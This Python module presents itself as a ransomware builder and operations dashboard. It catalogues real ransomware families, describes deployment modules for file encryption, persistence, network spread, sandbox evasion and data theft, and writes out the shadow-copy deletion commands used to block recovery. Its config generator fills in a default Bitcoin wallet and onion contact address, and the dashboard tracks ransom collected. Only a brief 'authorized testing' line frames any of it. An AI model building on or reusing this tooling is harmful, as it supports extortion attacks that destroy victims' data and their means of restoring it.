"""quantum.control.ransomware — Ransomware tools and modules for deployment.

Provides ransomware builder, deployment modules, and management dashboard.
FOR AUTHORIZED SECURITY TESTING AND RESEARCH ONLY.
"""
from __future__ import annotations

from datetime import datetime

from quantum.core.logging import log

RANSOMWARE_TOOLS = {
    "lockbit": {
        "name": "LockBit 3.0",
        "type": "Ransomware-as-a-Service",
        "language": "C++",
        "features": ["AES-256 encryption", "RSA-2048 key wrapping", "shadow copy deletion",
                      "network propagation", "anti-analysis", "self-deletion"],
        "targets": ["Windows", "Linux", "VMware ESXi"],
        "github": "https://github.com/search?q=lockbit+ransomware&type=repositories",
    },
    "blackcat": {
        "name": "BlackCat/ALPHV",
        "type": "Ransomware-as-a-Service",
        "language": "Rust",
        "features": ["AES-256 encryption", "Rust-based", "cross-platform",
                      "triple extortion", "anti-analysis", "self-deletion"],
        "targets": ["Windows", "Linux", "macOS"],
        "github": "https://github.com/search?q=blackcat+alphv+ransomware&type=repositories",
    },
    "conti": {
        "name": "Conti",
        "type": "Ransomware-as-a-Service",
        "language": "C++",
        "features": ["AES-256 encryption", "32 threads", "shadow copy deletion",
                      "network propagation", "anti-analysis", "self-deletion"],
        "targets": ["Windows", "Linux"],
        "github": "https://github.com/search?q=conti+ransomware&type=repositories",
    },
    "revil": {
        "name": "REvil/Sodinokibi",
        "type": "Ransomware-as-a-Service",
        "language": "C++",
        "features": ["AES-256 encryption", "RSA-2048 key wrapping", "shadow copy deletion",
                      "network propagation", "anti-analysis", "self-deletion"],
        "targets": ["Windows", "Linux", "macOS"],
        "github": "https://github.com/search?q=revil+sodinokibi+ransomware&type=repositories",
    },
    "ryuk": {
        "name": "Ryuk",
        "type": "Targeted Ransomware",
        "language": "C++",
        "features": ["AES-256 encryption", "RSA-4096 key wrapping", "shadow copy deletion",
                      "network propagation", "anti-analysis", "self-deletion"],
        "targets": ["Windows"],
        "github": "https://github.com/search?q=ryuk+ransomware&type=repositories",
    },
    "wannacry": {
        "name": "WannaCry",
        "type": "Wormable Ransomware",
        "language": "C++",
        "features": ["AES-128 encryption", "RSA-2048 key wrapping", "EternalBlue propagation",
                      "shadow copy deletion", "anti-analysis", "self-deletion"],
        "targets": ["Windows"],
        "github": "https://github.com/search?q=wannacry+ransomware&type=repositories",
    },
    "petya": {
        "name": "Petya/NotPetya",
        "type": "Wiper/Ransomware",
        "language": "C++",
        "features": ["MBR encryption", "AES-128 encryption", "EternalBlue propagation",
                      "shadow copy deletion", "anti-analysis", "self-deletion"],
        "targets": ["Windows"],
        "github": "https://github.com/search?q=petya+notpetya+ransomware&type=repositories",
    },
    "gandcrab": {
        "name": "GandCrab",
        "type": "Ransomware-as-a-Service",
        "language": "C++",
        "features": ["AES-256 encryption", "RSA-2048 key wrapping", "shadow copy deletion",
                      "network propagation", "anti-analysis", "self-deletion"],
        "targets": ["Windows"],
        "github": "https://github.com/search?q=gandcrab+ransomware&type=repositories",
    },
    "maze": {
        "name": "Maze/Egregor",
        "type": "Ransomware-as-a-Service",
        "language": "C++",
        "features": ["AES-256 encryption", "RSA-2048 key wrapping", "shadow copy deletion",
                      "network propagation", "anti-analysis", "self-deletion"],
        "targets": ["Windows", "Linux"],
        "github": "https://github.com/search?q=maze+egregor+ransomware&type=repositories",
    },
    "darkside": {
        "name": "DarkSide",
        "type": "Ransomware-as-a-Service",
        "language": "C++",
        "features": ["AES-256 encryption", "RSA-2048 key wrapping", "shadow copy deletion",
                      "network propagation", "anti-analysis", "self-deletion"],
        "targets": ["Windows", "Linux"],
        "github": "https://github.com/search?q=darkside+ransomware&type=repositories",
    },
}

DEPLOYMENT_MODULES = {
    "encrypt_files": {
        "name": "File Encryption Module",
        "description": "Encrypts files on the target system using AES-256-GCM",
        "targets": ["Windows", "Linux", "macOS"],
        "file_types": [".doc", ".docx", ".xls", ".xlsx", ".pdf", ".jpg", ".png",
                        ".mp4", ".mp3", ".zip", ".rar", ".7z", ".sql", ".db"],
        "extensions": [".encrypted", ".locked", ".crypto"],
    },
    "shadow_delete": {
        "name": "Shadow Copy Deletion",
        "description": "Deletes Windows Volume Shadow Copies to prevent recovery",
        "targets": ["Windows"],
        "commands": ["vssadmin delete shadows /all /quiet", "wmic shadowcopy delete"],
    },
    "network_propagation": {
        "name": "Network Propagation",
        "description": "Propagates across network using SMB/RDP/SSH",
        "targets": ["Windows", "Linux"],
        "protocols": ["SMB", "RDP", "SSH", "WinRM"],
    },
    "persistence": {
        "name": "Persistence Module",
        "description": "Establishes persistence via registry, cron, or systemd",
        "targets": ["Windows", "Linux", "macOS"],
        "methods": ["registry_run_key", "scheduled_task", "cron_job", "systemd_service",
                     "launch_agent", "startup_folder"],
    },
    "anti_analysis": {
        "name": "Anti-Analysis Module",
        "description": "Detects and evades sandboxes, VMs, and debuggers",
        "targets": ["Windows", "Linux", "macOS"],
        "techniques": ["vm_detection", "sandbox_detection", "debugger_detection",
                        "sleep_acceleration", "process_injection"],
    },
    "data_exfiltration": {
        "name": "Data Exfiltration Module",
        "description": "Exfiltrates sensitive data before encryption",
        "targets": ["Windows", "Linux", "macOS"],
        "methods": ["DNS_tunneling", "HTTPS_POST", "FTP", "SFTP", "cloud_upload"],
    },
    "ransom_note": {
        "name": "Ransom Note Generator",
        "description": "Generates ransom notes with payment instructions",
        "targets": ["Windows", "Linux", "macOS"],
        "formats": ["txt", "html", "bmp", "png"],
    },
    "self_deletion": {
        "name": "Self-Deletion Module",
        "description": "Deletes the ransomware binary after execution",
        "targets": ["Windows", "Linux", "macOS"],
        "methods": ["cmd_del", "powershell_del", "shred", "unlink"],
    },
}


def list_ransomware_tools() -> dict:
    """List all ransomware tools and their capabilities."""
    return RANSOMWARE_TOOLS


def list_deployment_modules() -> dict:
    """List all deployment modules."""
    return DEPLOYMENT_MODULES


def generate_ransomware_config(tool: str, target_os: str = "Windows",
                                encryption: str = "AES-256-GCM",
                                ransom_amount: float = 1000.0,
                                wallet_address: str = None,
                                contact_email: str = None) -> dict:
    """Generate a ransomware deployment configuration."""
    if tool not in RANSOMWARE_TOOLS:
        return {"error": f"Unknown tool: {tool}. Available: {list(RANSOMWARE_TOOLS.keys())}"}
    info = RANSOMWARE_TOOLS[tool]
    out = {
        "tool": tool,
        "name": info["name"],
        "target_os": target_os,
        "encryption": encryption,
        "ransom_amount": ransom_amount,
        "wallet_address": wallet_address or "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
        "contact_email": contact_email or "decrypt@onionmail.org",
        "generated_at": datetime.now().isoformat(),
        "modules": {
            "encrypt_files": True,
            "shadow_delete": target_os == "Windows",
            "network_propagation": True,
            "persistence": True,
            "anti_analysis": True,
            "data_exfiltration": True,
            "ransom_note": True,
            "self_deletion": True,
        },
        "file_extensions": [".encrypted", ".locked", ".crypto"],
        "target_file_types": [".doc", ".docx", ".xls", ".xlsx", ".pdf", ".jpg", ".png",
                               ".mp4", ".mp3", ".zip", ".rar", ".7z", ".sql", ".db"],
        "propagation_protocols": ["SMB", "RDP", "SSH", "WinRM"],
        "persistence_methods": ["registry_run_key", "scheduled_task", "cron_job",
                                 "systemd_service", "launch_agent", "startup_folder"],
        "anti_analysis_techniques": ["vm_detection", "sandbox_detection",
                                      "debugger_detection", "sleep_acceleration",
                                      "process_injection"],
        "exfiltration_methods": ["DNS_tunneling", "HTTPS_POST", "FTP", "SFTP", "cloud_upload"],
    }
    log(f"Ransomware config generated: {tool} for {target_os}", "RANSOMWARE")
    return out


def ransomware_dashboard_state() -> dict:
    """Return the full ransomware dashboard state for the UI."""
    return {
        "tools": RANSOMWARE_TOOLS,
        "deployment_modules": DEPLOYMENT_MODULES,
        "active_deployments": [],
        "total_encrypted": 0,
        "total_ransom_collected": 0.0,
        "generated_at": datetime.now().isoformat(),
    }
